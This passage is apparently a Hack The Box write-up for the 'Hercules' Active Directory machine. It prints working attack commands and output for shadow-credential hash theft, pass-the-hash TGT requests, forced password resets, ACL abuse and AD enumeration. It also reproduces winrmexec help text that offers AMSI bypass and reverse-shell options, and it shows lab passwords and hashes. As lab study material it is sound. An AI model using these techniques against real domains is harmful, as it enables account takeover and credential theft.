└─$ powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.129.x.x -d --no-pass  
/home/kali/.local/share/uv/tools/powerview/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Logging directory is set to /home/kali/.powerview/logs/hercules-bob.w-dc.hercules.htb
[2025-10-22 03:08:20] [ConnectionPool] Started LDAP connection pool cleanup thread
[2025-10-22 03:08:20] [ConnectionPool] Started LDAP connection pool keep-alive thread
[2025-10-22 03:08:20] LDAP sign and seal are supported
[2025-10-22 03:08:20] TLS channel binding is supported
[2025-10-22 03:08:20] Authentication: SASL, User: bob.w@hercules.htb
[2025-10-22 03:08:20] Connecting to dc.hercules.htb, Port: 636, SSL: True
[2025-10-22 03:08:20] Using Kerberos Cache: bob.w.ccache
[2025-10-22 03:08:20] SPN LDAP/DC.HERCULES.HTB@HERCULES.HTB not found in cache
[2025-10-22 03:08:20] AnySPN is True, looking for another suitable SPN
[2025-10-22 03:08:20] Returning cached credential for KRBTGT/HERCULES.HTB@HERCULES.HTB
[2025-10-22 03:08:20] Using TGT from cache
[2025-10-22 03:08:20] Trying to connect to KDC at 10.129.x.x:88
[2025-10-22 03:08:27] [Storage] Using cache directory: /home/kali/.powerview/storage/ldap_cache
[2025-10-22 03:08:27] [VulnerabilityDetector] Loaded up-to-date vulnerability rules from /home/kali/.powerview/vulns.json
[2025-10-22 03:08:27] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-22 03:08:27] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=bob.w)(name=bob.w)(displayName=bob.w)(objectSid=bob.w)(distinguishedName=bob.w)(dnsHostName=bob.w)(objectGUID=*bob.w*)))
[2025-10-22 03:08:27] [Storage] Deleted expired cache file: 104fbbb6781a541e9d86080b78900a13
[2025-10-22 03:08:29] [ConnectionPool] LDAP added connection for domain: hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯
```

We will use `Set-DomainObjectDN` to modify object's distinguishedName attribute as well as changing OU

```bash
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectDN
the following arguments are required: -Identity, -DestinationDN
```

```bash
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
[2025-10-22 03:11:10] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-22 03:11:10] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
[2025-10-22 03:11:10] [Storage] Deleted expired cache file: 65cfcbffd861dd403e300396f20549b9
[2025-10-22 03:11:10] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-22 03:11:10] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2025-10-22 03:11:10] [Storage] Deleted expired cache file: ebfe4a89099bc302751fd00ae775a433
[2025-10-22 03:11:10] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-22 03:11:11] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

Good to go, now we can perform shadow-credentials again `stephen.m` to got that hash.

```bash
└─$ export KRB5CCNAME=natalie.a.ccache
```

```bash
└─$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -dc-ip 10.129.x.x -account stephen.m
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd72877fedf6a496988200ab57225eedb'
[*] Adding Key Credential with device ID 'd72877fedf6a496988200ab57225eedb' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID 'd72877fedf6a496988200ab57225eedb' to the Key Credentials for 'stephen.m'
[*] Authenticating as 'stephen.m' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Restoring the old Key Credentials for 'stephen.m'
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
```

Then request for TGT.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -hashes :9aaaedcb19e612216a2dac9badb3c210 -k hercules.htb/stephen.m
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in stephen.m.ccache
```

Now we back to bloodhound and seeing that.

![Hercules Website Bloodhound Legacy stephen.m](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-stephenm.png)

We can see that `stephen.m` is member of `SECURITY HELPDESK@HERCULES.HTB` group that got [forcechangepassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) to `Auditor` and `Vincent.G` as well. <br>
It also show that in the `Shortest Path` as well that we have mention in overview.

![Hercules Website Bloodhound Legacy stephen.m Shortest Path](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-stephenm-shortest-path.png)

Now we will change the password for `Auditor` via `bloodyAD`.

```bash
└─$ bloodyAD -d hercules.htb -u stephen.m -k --host dc.hercules.htb --dc-ip 10.129.x.x set password Auditor 'Handsomeprince123@'
[+] Password changed successfully!
```

Then request TGT for `Auditor`.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -k hercules.htb/Auditor:'Handsomeprince123@'                                                    
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Auditor.ccache
```

![Hercules Website Bloodhound Legacy Auditor](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-auditor.png)

We know that `Auditor` is member of `REMOTE MANAGEMENT@HERCULES.HTB` so we can remote into it via `evil-wirnm` but the from the `nmap` result only port `5986` is open. <br>
&rarr; So we will use [winrmexec](https://github.com/ozelis/winrmexec) as it got options to supported.

```bash
└─$ python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\Auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\auditor\Documents>
```

```powershell
PS C:\Users\auditor\Documents> cd ..\Desktop
PS C:\Users\auditor\Desktop> dir


    Directory: C:\Users\auditor\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/21/2025   7:09 PM             34 user.txt                                                              


PS C:\Users\auditor\Desktop> type user.txt
a00756xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Now we are able to grab that `user.txt` flag which is a journey :D.

## Initial Access
After we are in `Auditor`, we doing some recon inside this session to uncover more things.

### Discovery
```powershell
PS C:\Shares> dir


    Directory: C:\Shares


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Department                                                            
d-----         12/4/2024  11:45 AM                Users                                                                 


PS C:\Shares> cd Department
PS C:\Shares\Department> dir


    Directory: C:\Shares\Department


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Engineering Department                                                
d-----         12/4/2024  11:45 AM                IT                                                                    
d-----         12/4/2024  11:45 AM                Recruitment                                                           
d-----         12/4/2024  11:45 AM                Security Department                                                   
d-----         12/4/2024  11:45 AM                Web Department
```

Find out there is some folder related to groups stayed in `C:\Shares\Department`. <br>
&rarr; Gonna check each of them out.

```bash
PS C:\Shares\Department\IT> dir


    Directory: C:\Shares\Department\IT


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:45 AM           1048 cleanup.lnk                                                           
-a----         12/4/2024  11:15 AM            935 notice.eml
```

After checking out, we found out these in `IT` that got `cleanup.lnk` which is a Microsoft Windows shortcut file and `notice.eml` a file format for a saved electronic mail message that includes the sender, recipients, subject, body, and attachments. <br>
&rarr; Let's check these out.

```powershell
PS C:\Shares\Department\IT> type notice.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues=
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

Got mail from `ashley.b` to `IT Support` talking about changing passwords and permission issues and also mention to run shortcut in share.

```powershell
PS C:\Shares\Department\IT> type cleanup.lnk
LÀF‹ ƒj&îEÛ_Òl&îEÛ_Òl&îEÛf½PàOÐ ê:i¢+00/C:\x1„Y™
Usersd  ï¾¨RÚ@„Y™
. :¿§ÎUsers@shell32.dll,-21813Z1„Y§
ashley.bB       ï¾„Y˜
„Y§
.ÿW v)ashley.b▒V1„Y§
Desktop@        ï¾„Y˜
„Y§
.       X‡u0Desktopf2f„Y¥
 aCleanup.ps1J  ï¾„Y¥
„Y¥
.ÏX     ¡ÊaCleanup.ps1U-TU½´^C:\Users\ashley.b\Desktop\aCleanup.ps1,..\..\..\Users\ashley.b\Desktop\aCleanup.ps1 ÿÿÿÿ¥
                                                                                                                       rÒb
Å°K£‚i}Ír›€¥` XdcÁ›à±ï¤'ˆGÍÁ›à±ï¤'ˆGÍÎ   ‰1SPSâŠXF¼L8C»ü“&˜mÎm-S-1-5-21-1889966460-2597381952-958560702-50091SPS±mD­pH§H@.¤=xŒhH>.ôäP
```

Show the path for cleanup script &rarr; `C:\Users\ashley.b\Desktop\aCleanup.ps1`. <br>
&rarr; This `ashley.b` user is worth that will give us new rights when using this script.

Now we got inside `Auditor`, it better to run `bloodhound` again to see if we can collect more data inside this user.

```bash
└─$ bloodhound-python -u Auditor -p 'Handsomeprince123@' -d hercules.htb -dc dc.hercules.htb -ns 10.129.x.x -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 6 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 50 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 53S
```

We can see there is different result from previsous bloodhound that it collets more data. <br>
&rarr; Let's inject again and see what is different.

### Bloodhound
![Hercules Website Bloodhound Legacy Auditor 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-auditor-1.png)

Remember that `Auditor` is member of 4 groups that include `Forest Management`.

```powershell
PS C:\Shares\Department\Web Department> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Let's check out this group.

![Hercules Website Bloodhound Legacy Auditor Forest Management](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-auditor-forest-management.png)

We can see that `FOREST MANAGEMENT@HERCULES.HTB` got `GenericAll` over `FOREST MIGRATION@HERCULES.HTB`. <br>
&rarr; Check out what `FOREST MIGRATION@HERCULES.HTB` can do.

![Hercules Website Bloodhound Legacy Auditor Forest Migration](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-auditor-forest-migration.png)

See that we can `WriteDacl` to `ADMINISTRATOR@HERCULES.HTB` group that contain `admin` and also can `GenericAll` to `DOMAIN ADMINISTRATOR@HERCULES.HTB` group to get `administrator` as well. <br>
&rarr; So we gonna grant `GenericAll` on `FOREST MIGRATION@HERCULES.HTB` OU to `Auditor`.

```bash
└─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

At this stage, kinda confuse that next step to do so using again [powerview.py](https://github.com/aniqfakhrul/powerview.py). <br>
&rarr; We will enum with `Get-ADObject` to get all the domain objects in AD.

Now we got some problem, the result is alot that notice some account that is not enable yet we can not take time to re-enable and checking again and again which quite time-consuming alot and not really effective. <br>
Then we try back again `Bloodhound CE` but this one we will try with `v7.4.1` and hopefully it can digest our data proprably. <br>
To ensure more, we will use [RustHound-CE](https://github.com/g0h4n/RustHound-CE) as the `bloodhound-python` one may collect data that can only digest into `Bloodhound Legacy` only. <br>
&rarr; Now start again with `bloodhound-cli` then we will modified some changed.

> *We can either use `rusthound-ce` or `bloodhound-python-ce` so that data collector can go with `Bloodhound CE` one, and for `Bloodhound Legacy` will go with `bloodhound-python` one.*

So when we finish install, go to `~/.config/bloodhound` and check out `docker-compose.yml` and edit again.

```yml
bloodhound:
    labels:
      name: bhce_bloodhound
    image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}
```

Change to `7.4.1`.

```yml
bloodhound:
    labels:
      name: bhce_bloodhound
    image: docker.io/specterops/bloodhound:7.4.1
```

When doing this be sure to go to this path and `docker-compose down` first then edit after that we can `docker-compose up -d` again. <br>
&rarr; Running the data collector again `auditor`.

```bash
└─$ rusthound-ce -d hercules.htb -u auditor -p 'Handsomeprince123@' -n 10.129.x.x -c DCOnly          
---------------------------------------------------
Initializing RustHound-CE at 12:16:42 on 10/22/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-10-22T16:16:42Z INFO  rusthound_ce] Verbosity level: Info
[2025-10-22T16:16:42Z INFO  rusthound_ce] Collection method: DCOnly
[2025-10-22T16:16:43Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-10-22T16:16:43Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-10-22T16:16:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-22T16:16:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-10-22T16:16:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-22T16:16:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-10-22T16:16:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-22T16:16:49Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-10-22T16:16:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-22T16:16:50Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-10-22T16:16:50Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-22T16:16:50Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-10-22T16:16:50Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠈ Parsing LDAP objects: 44%                                                                                                                                                                                                                                                                                                 [2025-10-22T16:16:50Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates                                                                                                                                                                                                                     
[2025-10-22T16:16:51Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_users.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_groups.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_computers.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_ous.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_domains.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_gpos.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_containers.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_ntauthstores.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_aiacas.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_rootcas.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_enterprisecas.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_certtemplates.json created!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-10-22T16:16:51Z INFO  rusthound_ce::json::maker::common] .//20251022121651_hercules-htb_issuancepolicies.json created!

RustHound-CE Enumeration Completed at 12:16:51 on 10/22/25! Happy Graphing!
```

As we can see there are some different output that we can not see with `bloodhound-python`. <br>
And this one just bonus more that we are doing in target that use kerberos so we can generate `/etc/krb5.conf` and run again with `-k` option that no need to provide password and username either.

```bash
└─$ nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --generate-krb5-file krb5.conf    
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] krb5 conf saved to: krb5.conf
SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 

└─$ sudo mv krb5.conf /etc/krb5.conf

└─$ cat /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = HERCULES.HTB

[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
        default_domain = hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

```bash
└─$ rusthound-ce -d hercules.htb -f dc.hercules.htb -c All -k -no-pass -z
---------------------------------------------------
Initializing RustHound-CE at 23:59:32 on 10/22/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-10-23T03:59:32Z INFO  rusthound_ce] Verbosity level: Info
[2025-10-23T03:59:32Z INFO  rusthound_ce] Collection method: All
[2025-10-23T03:59:34Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-10-23T03:59:34Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-10-23T03:59:34Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-23T03:59:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-10-23T03:59:36Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-23T03:59:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-10-23T03:59:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-23T03:59:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-10-23T03:59:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-23T03:59:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-10-23T03:59:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-23T03:59:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-10-23T03:59:46Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠐ Parsing LDAP objects: 39%                                                                                                                                                                                                                                                                                                 [2025-10-23T03:59:46Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates                                                                                                                                                                                                                     
[2025-10-23T03:59:46Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-10-23T03:59:46Z INFO  rusthound_ce::json::maker::common] .//20251022235946_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 23:59:46 on 10/22/25! Happy Graphing!
```

We can see that the result is also the same but use the kerberos authentication that way more creds hygiene and stealthier. <br>
&rarr; Now searching path from `auditor` to `admin` to see if we got more info to exploit.

![Hercules Website Bloodhound CE Auditor to Admin](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-auditor-to-admin.png)

Huge different result, see that `FOREST MIGRATION@HERCULES.HTB` contains `fernando.r` which is member of `SMARTCARD OPERATORS@HERCULES.HTB` then we can `ADCSESC3` to `HERCULES.HTB`. <br>
These path we can not get from `Bloodhound Legacy` one. <br>
&rarr; Let's check out `fernando.r` user.

![Hercules Website Bloodhound CE Auditor Fernando.r](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-auditor-fernandor.png)

We see that `fernando.r` is not yet enable. <br>
&rarr; Let's double-check to see `FOREST MIGRATION@HERCULES.HTB` still contain any more users.

![Hercules Website Bloodhound CE Auditor Forest Migration](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-auditor-forest-migration.png)

Notice that `iis_administrator` which is really potential so we will keep this one for later discover on it. <br>
&rarr; Back to `fernando.r`, we will re-enable it then perform the `ESC3` attack.

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "fernando.r"


DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
